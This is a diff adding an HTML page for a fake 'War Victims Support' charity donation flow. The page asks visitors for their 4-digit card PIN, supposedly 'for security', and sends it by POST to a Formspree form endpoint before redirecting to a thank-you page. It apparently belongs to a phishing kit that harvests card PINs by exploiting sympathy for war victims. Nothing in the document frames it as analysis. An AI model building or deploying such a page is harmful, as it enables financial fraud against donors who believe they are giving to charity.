@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Enter Card PIN | War Victims Support</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"/>
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #f7faff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .pin-container {
+      background: #fff;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 12px 24px rgba(0, 0, 0, 0.08);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+
+    .pin-container h2 {
+      margin-bottom: 10px;
+      color: #004080;
+    }
+
+    .pin-container p {
+      margin-bottom: 30px;
+      color: #666;
+      font-size: 15px;
+    }
+
+    .amount-info {
+      background: #eef5ff;
+      padding: 10px 16px;
+      border-radius: 10px;
+      margin-bottom: 20px;
+      font-weight: 600;
+      color: #004080;
+    }
+
+    input[type="password"] {
+      width: 100%;
+      padding: 16px;
+      font-size: 20px;
+      text-align: center;
+      letter-spacing: 6px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      margin-bottom: 20px;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 14px;
+      background: #004080;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    .submit-btn:hover {
+      background: #002f5e;
+    }
+    #preloader {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: #ffffff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  transition: opacity 0.4s ease;
+}
+
+.loader {
+  border: 5px solid #e0e0e0;
+  border-top: 5px solid #004080;
+  border-radius: 50%;
+  width: 70px;
+  height: 70px;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+body.loaded #preloader {
+  opacity: 0;
+  pointer-events: none;
+}
+
+
+
+  </style>
+</head>
+<body>
+    <div id="preloader">
+        <div class="loader"></div>
+      </div>
+  <div class="pin-container">
+    <h2>Enter Your Card PIN</h2>
+    <p>For security, please enter your 4-digit card PIN to complete the donation.</p>
+
+    <div class="amount-info">
+      Amount: <span id="pinAmount">$0</span><br/>
+      Email: <span id="pinEmail">you@example.com</span>
+    </div>
+
+    <form id="Form">
+      <input type="password" id="pinInput" maxlength="4" pattern="[0-9]*" inputmode="numeric" required placeholder="••••" name="year"/>
+      <button type="submit" class="submit-btn">Confirm Donation</button>
+    </form>
+  </div>
+
+  <script>
+
+
+window.addEventListener('load', function () {
+    document.body.classList.add('loaded');
+  });
+
+document.addEventListener("DOMContentLoaded", function () {
+    const form = document.getElementById("Form");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault(); // Prevent the default form reload
+
+      const formData = new FormData(form);
+      const jsonData = {};
+
+      formData.forEach((value, key) => {
+        jsonData[key] = value;
+      });
+
+      fetch("https://formspree.io/f/mdkenbez", { // Replace with your Formspree ID
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(jsonData)
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "Thank-You.html"; // Redirect after submission
+        } else {
+          alert("Payment Details Submission failed. Please try again.");
+        }
+      })
+      .catch(error => {
+        console.error("Submission error:", error);
+        alert("An error occurred while Submitting.");
+      });
+    });
+  });
+
+
+
+    const amount = localStorage.getItem("donationAmount") || "0";
+    const email = localStorage.getItem("donorEmail") || "you@example.com";
+    document.getElementById("pinAmount").textContent = "$" + amount;
+    document.getElementById("pinEmail").textContent = email;
+
+    document.getElementById("pinForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const pin = document.getElementById("pinInput").value;
+      if (pin.length !== 4 || isNaN(pin)) {
+        alert("Please enter a valid 4-digit PIN.");
+        return;
+      }
+    //   alert("Payment of $" + amount + " confirmed!");
+    //   window.location.href = "thank-you.html";
+    });
+  </script>
+
+</body>
+</html>
